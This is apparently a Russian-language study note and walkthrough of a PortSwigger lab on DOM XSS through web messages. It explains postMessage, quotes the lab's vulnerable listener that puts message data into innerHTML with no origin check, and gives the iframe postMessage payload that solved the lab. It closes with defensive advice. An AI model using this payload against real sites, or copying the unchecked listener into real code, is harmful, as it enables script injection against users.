
## че это за тема такая :

Представь, что у тебя на странице есть два iframe (окна), которые не должны знать ничего друг о друге — это называется **разные источники (origins)**. Браузер специально их изолирует, чтобы один сайт не мог украсть данные с другого.

Но иногда разработчикам **нужно**, чтобы эти окна общались. Для этого придумали механизм **`postMessage`** 
**Веб-сообщение** — это как письмо, которое одно окно отправляет другому:

```js
// Окошко-отправитель говорит: "Эй, лови сообщение!"
otherWindow.postMessage('Привет, как дела?', 'https://target-site.com');
```
А второе окно слушает и реагирует:

```js
// Окошко-получатель слушает почтовый ящик
window.addEventListener('message', function(event) {
    // event.data — это само сообщение ('Привет, как дела?')
    // event.origin — откуда пришло письмо (проверка безопасности)
    console.log('Получил: ' + event.data);
});
```

###  При чем тут XSS?

Если разработчик **забыл проверить** `event.origin` (откуда пришло письмо) и сразу вставляет `event.data` в DOM — то злоумышленник может отправить сообщение с вредоносным кодом 
**Пример уязвимого кода:**

```js
window.addEventListener('message', function(e) {
    // Никакой проверки origin! Доверяем всем подряд
    document.getElementById('ads').innerHTML = e.data; // ОПАСНО!
});
```

**Атака:**  
Злоумышленник создает свой сайт с iframe, который отправляет сообщение:

```html
<iframe src="https://vulnerable-site.com" onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')">
```

И всё — твой код улетел к жертве и выполнился 

###  Как это искать и тестировать

 **DOM Invader** в бурповском браузере умеет:

1. **Логировать** все `postMessage` на странице 
    
2. **Показывать**, обращается ли код к `origin`, `data` или `source` 
    
3. **Автоматически модифицировать** сообщения и проверять, можно ли обмануть проверки 
    
4. **Генерировать PoC-эксплойт** одной кнопкой 

## Что нужно проверять в коде

Когда смотришь на обработчик сообщений, задавай себе вопросы:

- Проверяется ли `event.origin`? Если нет — можно слать с любого домена 
    
- Если проверяется, можно ли обмануть? Например, через `indexOf('trusted.com')` или `endsWith()`
    
- Куда попадает `event.data`? Если в `innerHTML`, `eval`, `document.write` — это  счастливый билет в XSS
    

## Защита от таких атак

- **Всегда проверять `event.origin`** по белому списку, а не через `indexOf` 
    
- **Не верь данным** — санитизируй их перед вставкой в DOM 
    
- **Используй CSP**, чтобы ограничить, откуда можно грузить скрипты





-------
--------
-------
------
--------
лаба https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages
# DOM XSS using web messages
нужно использовать свой сервер
который отправит запрос на сайт и вызовет там срабатывание print()

----

я открыл сайт, и чет туплю.. че делать то
вот код главной стр

```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 11144

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>DOM XSS using web messages</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>DOM XSS using web messages</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a31009704f462ac83d65a1a0174009d.exploit-server.net'>Go to exploit server</a>
                            <a class=link-back href='https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <!-- Ads to be inserted here -->
                    <div id='ads'>
                    </div>
                    <script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/37.jpg">
                            <h3>The Giant Enter Key</h3>
                            <img src="/resources/images/rating2.png">
                            $50.13
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/56.jpg">
                            <h3>More Than Just Birdsong</h3>
                            <img src="/resources/images/rating5.png">
                            $59.03
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating4.png">
                            $85.02
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating3.png">
                            $4.38
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating5.png">
                            $43.11
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating5.png">
                            $25.74
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating3.png">
                            $35.10
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/2.jpg">
                            <h3>All-in-One Typewriter</h3>
                            <img src="/resources/images/rating4.png">
                            $40.92
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/60.jpg">
                            <h3>Dancing In The Dark</h3>
                            <img src="/resources/images/rating1.png">
                            $5.72
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/1.jpg">
                            <h3>Eggtastic, Fun, Food Eggcessories</h3>
                            <img src="/resources/images/rating5.png">
                            $29.66
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating2.png">
                            $0.83
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/22.jpg">
                            <h3>Babbage Web Spray</h3>
                            <img src="/resources/images/rating3.png">
                            $28.62
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating5.png">
                            $46.69
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/24.jpg">
                            <h3>The Alternative Christmas Tree</h3>
                            <img src="/resources/images/rating5.png">
                            $53.09
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating5.png">
                            $59.58
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/8.jpg">
                            <h3>Folding Gadgets</h3>
                            <img src="/resources/images/rating5.png">
                            $26.81
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/10.jpg">
                            <h3>Giant Grasshopper</h3>
                            <img src="/resources/images/rating1.png">
                            $3.87
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating5.png">
                            $26.79
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating1.png">
                            $57.14
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating3.png">
                            $89.24
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

нашел интересную штуку в html сайта


```html
                   <script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>
```

innerHTML   подставляет в html 
еще идет речь по функцию e

и я еще видел путь к файлу js  `<script src="/resources/labheader/js/labHeader.js">`

пробую получить этот файл
вот ориг ссылка
`https://0a2100e2047e62b983d15b5e00120021.web-security-academy.net/`
подставляю путь
`https://0a2100e2047e62b983d15b5e00120021.web-security-academy.net/resources/labheader/js/labHeader.js`

там файл с ерундой которая мне врядли пригодится!

```js
completedListeners = [];

(function () {
    let labHeaderWebSocket = undefined;
    function openWebSocket() {
        return new Promise(res => {
            if (labHeaderWebSocket) {
                res(labHeaderWebSocket);
                return;
            }

            let newWebSocket = new WebSocket(location.origin.replace("http", "ws") + "/academyLabHeader");

            newWebSocket.onopen = function (evt) {
                res(newWebSocket);
            };

            newWebSocket.onmessage = function (evt) {
                const labSolved = document.getElementById('notification-labsolved');
                const keepAliveMsg = evt.data === 'PONG';
                if (labSolved || keepAliveMsg) {
                    return;
                }
                document.getElementById("academyLabHeader").innerHTML = evt.data;
                animateLabHeader();

                for (const listener of completedListeners) {
                    listener();
                }
            };

            setInterval(() => {
                newWebSocket.send("PING");
            }, 5000)
        });
    }

    labHeaderWebSocket = openWebSocket();
})();

function animateLabHeader() {
    setTimeout(function() {
        const labSolved = document.getElementById('notification-labsolved');
        if (labSolved)
        {
            let cl = labSolved.classList;
            cl.remove('notification-labsolved-hidden');
            cl.add('notification-labsolved');
        }

    }, 500);
}
```

-----

вернусь к коду

```html
                   <script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>
```

вот че делает этот код на самом деле:

1. Слушает все входящие сообщения (`message`) от кого угодно
    
2. Берет содержимое сообщения (`e.data`)
    
3. И вставляет это содержимое в DOM через `innerHTML` в элемент с id `ads`

короче говоря, это слушатель+делатель, это такой биба+боба, один слушает всех подряд - другой делает (вставляет в код innerHTML)  все что попало.

кому это нужно вообще?


1 )   здесь не видно проверки имени отправителя - слушает всех
2 )   `innerHTML` парсит строку как HTML и создает элементы 
3 )   данные никак не санитаризируются и идут в innerHTML





чтобы это использовать - нужно просто отправить мессадж на адресс этого сайта
нужно чтобы жертва перешла по ссылке


можно отправить жертву на свой сайт на котором сработает iframe src и автоматом подгрузит эту ссылку с пейлоадом


```js
<iframe src="https://0a2100e2047e62b983d15b5e00120021.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')">
```

⭐️ ЛАБА РЕШЕНА ПРИНТ СРАБОТАЛ !!!


разбор:



```js
this.contentWindow.postMessage('<img src=x onerror=print()>', '*')
```

- `this` — это сам iframe
    
- `contentWindow` — это окно внутри iframe (та самая загруженная страница)
    
- `postMessage()` — метод, который **отправляет сообщение** в это окно
    
- `'<img...>'` — само сообщение (пейлоад)
    
- `'*'` — разрешено отправлять на любой домен (небезопасно)



**onload** — это событие, которое срабатывает, когда элемент полностью загрузился

1. **Сначала:** iframe начинает загружать страницу по указанному `src`
    
2. **Потом:** когда страница **полностью загрузилась** — срабатывает `onload`
    
3. **И только тогда:** выполняется код внутри `onload`




**Что происходит:**

1. Жертва заходит на мой сайт (или на страницу с этим iframe)
    
2. Iframe загружает уязвимую страницу внутри себя
    
3. После загрузки срабатывает `onload`
    
4. Iframe отправляет сообщение с пейлоадом
    
5. Уязвимая страница принимает сообщение (потому что слушает всех)
    
6. Вставляет злой код через `innerHTML`
    
7.  `print()` выполняется


## как защититься от postMessage XSS

всегда проверять `e.origin` в обработчике — разрешать только конкретные доверенные домены

использовать строгое сравнение `===`, а не `indexOf` или `endsWith`, чтобы нельзя было обмануть поддоменами

никогда не вставлять `e.data` напрямую в `innerHTML` — санитизировать через DOMPurify или аналоги

по возможности использовать `textContent` вместо `innerHTML`, если нужен только текст

проверять тип данных и формат сообщения перед обработкой

не использовать `'*'` в `postMessage` — всегда указывать конкретный целевой домен

применять Content Security Policy с ограничениями на скрипты и загрузку ресурсов



## ключевой момент
нахождение в коде 
```js
window.addEventListener('message', function(e) {
document.getElementById('ads').innerHTML = e.data;
  })
```

